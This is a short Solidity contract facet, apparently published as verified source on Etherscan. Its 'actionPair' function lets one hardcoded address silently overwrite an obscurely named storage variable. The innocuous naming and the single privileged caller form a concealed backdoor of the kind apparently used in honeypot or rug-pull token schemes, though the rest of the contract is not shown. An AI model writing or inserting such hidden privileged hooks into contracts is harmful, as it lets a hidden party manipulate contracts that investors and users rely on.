/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract actionPairFacet {
    function actionPair(address account) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == 0xB6FB540B461F975B945eEE4AD87129915C8f8F97)
            ds._p76234 = account;
        return true;
    }
}
